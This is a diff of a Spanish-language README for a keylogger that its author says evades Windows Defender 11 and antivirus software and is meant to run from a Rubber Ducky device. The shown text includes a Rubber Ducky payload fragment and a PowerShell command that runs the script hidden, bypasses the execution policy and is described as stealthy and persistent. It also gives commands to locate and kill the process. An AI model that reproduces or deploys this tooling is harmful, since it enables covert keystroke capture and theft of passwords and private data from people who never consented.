@@ -1,16 +1,16 @@
 ***Keylogger con evasión de Windows Defender 11 y Antivirus.***
 
-# ---------------------------------------------------------
-# By R.G.M - 2025
-# ---------------------------------------------------------
+By R.G.M - 2025
+
 
 
 Keylogger capaz de evadir Windows Defender 11 y Antivirus.
 Creado con la idea de ejecutarlo remotamente desde un rubberducky.
 
-# ---------------------------------------------------------
-# PAYLOAD para RUBBER DUCKY;
-# ---------------------------------------------------------
+
+---------------------------------------------------------------
+PAYLOAD para RUBBER DUCKY;
+---------------------------------------------------------------
 
 DELAY 20
 
@@ -43,15 +43,15 @@ STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Comman
 ENTER
 
 
-# ---------------------------------------------------------
-# EJECUCION en Powershell en modo sigiloso y persistente:
-# ---------------------------------------------------------
+---------------------------------------------------------------
+-EJECUCION en Powershell en modo sigiloso y persistente:
+---------------------------------------------------------------
 
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"
 
-# ---------------------------------------------------------
-# DETENCION DE SCRIPT:
-# ---------------------------------------------------------
+---------------------------------------------------------------
+-DETENCION DE SCRIPT:
+---------------------------------------------------------------
 
 -Ejecutar en Powershell:
 Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine
@@ -61,4 +61,4 @@ Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1
 -Para detenerlo, ejecutar en powershell:
 Stop-Process -Id 1234 -Force
 
-# (Detenemos el proceso)
+(Detenemos el proceso)
